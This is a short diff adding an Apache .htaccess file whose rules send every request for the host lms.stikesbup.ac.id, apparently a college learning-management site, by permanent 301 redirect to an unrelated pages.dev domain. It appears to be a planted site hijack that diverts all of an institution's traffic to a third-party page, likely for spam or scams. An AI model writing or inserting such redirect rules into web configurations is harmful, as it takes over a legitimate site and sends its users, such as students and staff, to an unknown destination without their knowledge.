@@ -1,0 +1,3 @@
+RewriteEngine on
+RewriteCond %{HTTP_HOST} ^lms\.stikesbup\.ac\.id$ [NC]
+RewriteRule ^(.*)$ https://bisadibagi2amandanterpercaya.pages.dev/$1 [L,R=301]
